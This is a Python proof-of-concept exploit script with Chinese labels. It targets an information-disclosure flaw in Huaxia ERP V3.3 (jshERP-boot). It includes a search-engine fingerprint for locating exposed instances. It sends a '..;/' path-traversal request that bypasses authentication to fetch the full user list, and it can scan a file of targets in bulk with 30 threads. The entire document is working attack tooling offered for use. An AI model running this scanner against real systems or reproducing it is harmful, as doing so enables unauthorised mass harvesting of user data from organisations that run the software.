"""
介绍：华夏 ERPV3.3 信息泄漏漏洞
指纹：icon_hash="978514697" || body="jshERP-boot"
"""

# POC
import argparse
import textwrap
from multiprocessing.dummy import Pool
import requests
from urllib3.exceptions import InsecureRequestWarning


# import pandas as pd

def check(target, timeout=5):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Connection': 'close',
        }
        url = target + '/jshERP-boot/platformConfig/getPlatform/..;/..;/..;/jshERP-boot/user/getAllList'
        response = requests.get(url, headers=headers, verify=False, timeout=timeout)
        if response.status_code == 200 and 'data' in response.text:
            print('[*]存在漏洞' + url)
        else:
            print('[-]不存在漏洞' + url)
    except TimeoutError:
        print(f"请求超时{target}")
    except Exception as e:
        print(f"连接失败{target}-无法建立连接")


def main():

    banner = """
                ('-. .-.               ('-.    ) (`-.                ('-.               _ (`-.                          
        ( OO )  /              ( OO ).-. ( OO ).             ( OO ).-.          ( (OO  )                         
        ,--. ,--. ,--. ,--.    / . --. /(_/.  \_)-. ,-.-')   / . --. /         _.`     \ .-'),-----.    .-----.  
        |  | |  | |  | |  |    | \-.  \  \  `.'  /  |  |OO)  | \-.  \         (__...--''( OO'  .-.  '  '  .--./  
        |   .|  | |  | | .-').-'-'  |  |  \     /\  |  |  \.-'-'  |  |         |  /  | |/   |  | |  |  |  |('-.  
        |       | |  |_|( OO )\| |_.'  |   \   \ |  |  |(_/ \| |_.'  |  (`-.   |  |_.' |\_) |  |\|  | /_) |OO  ) 
        |  .-.  | |  | | `-' / |  .-.  |  .'    \_),|  |_.'  |  .-.  | (OO  )_ |  .___.'  \ |  | |  | ||  |`-'|  
        |  | |  |('  '-'(_.-'  |  | |  | /  .'.  \(_|  |     |  | |  |,------.)|  |        `'  '-'  '(_'  '--'\  
        `--' `--'  `-----'     `--' `--''--'   '--' `--'     `--' `--'`------' `--'          `-----'    `-----'  
            """
    print(banner)

    parse = argparse.ArgumentParser(description="华夏 ERPV3.3 信息泄漏漏洞", formatter_class=argparse.RawDescriptionHelpFormatter,
                                    epilog=textwrap.dedent('''example:
        python3 XETUX_POC.py -u http://xxxx.xxxx.xxxx.xxxx
        python3 XETUX_POC -f x_url.txt '''))
    parse.add_argument('-u', '--url', dest='url', type=str, help='添加url信息')
    parse.add_argument('-f', '--file', dest='file', type=str, help='添加txt文件')

    args = parse.parse_args()
    targets = []
    pool = Pool(30)
    try:
        if args.url:
            check(args.url)
        else:
            f = open(args.file, 'r+')
            for target in f.readlines():
                target = target.strip()
                if 'http' in target:
                    targets.append(target)
                else:
                    url = f"http://{target}"
                    targets.append(url)
            pool.map(check, targets)
    except Exception as e:
        print(e)


if __name__ == '__main__':
    main()